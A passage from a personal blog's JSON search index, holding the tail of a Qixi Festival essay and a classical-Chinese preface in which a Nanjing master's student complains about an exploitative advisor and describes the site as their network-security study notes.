感慨之余，余思衬毕竟七夕，不可枉费郎女会于鹊桥之美景也。于是余放胆祈求，月仙红线何时再缚余之心头？\n","date":"2024-09-04T16:33:50+08:00","permalink":"https://zhu1ang.github.io/p/%E4%B8%83%E5%A4%95%E9%9A%8F%E7%AC%94/","title":"七夕随笔"},{"content":"​\t余求学于金陵某学府，攻读硕士之业。吾自知才浅学疏，网安之事弗知一二，故无所求但期遇一明师指点一二使吾不致枉费十数年求学之功也。\n​\t然世事无常，人事多艰，吾虽再三思量却终身陷囹圄。吾所从之师，其形貌似人而所行之事比之狼豺野狗更甚。其平素不示以难，不指以困，反责吾等劳作之量甚微未及其预期也。更甚者，酬饷必延半载而后放，且斤斤计较、锱铢必较，师生之情全如商旅之事耳。暑假期间，犹命吾等加班不息，且督促倍加，以促进度。呜呼哀哉，是为吾与诸同窗之大不幸！\n​\t然余志在自强，冀望凭己绵薄之力，精一二之计术，辅日后之工作矣。此间所录，乃余学习之笔记，望能时时温故，悟新理，日新月异，以期小流积之成海、沙砾类之成山。顽石历经千磨虽不能成玉，然必有玉珏圆润清朗之光泽也。其中亦有吾之杂感随笔，权且聊以自娱，消磨闲暇，贻笑大方，深自惴惴。\n","date":"2024-09-04T16:14:47+08:00","permalink":"https://zhu1ang.github.io/p/%E8%87%AA%E9%93%AD%E5%BF%97/","title":"自铭志"}]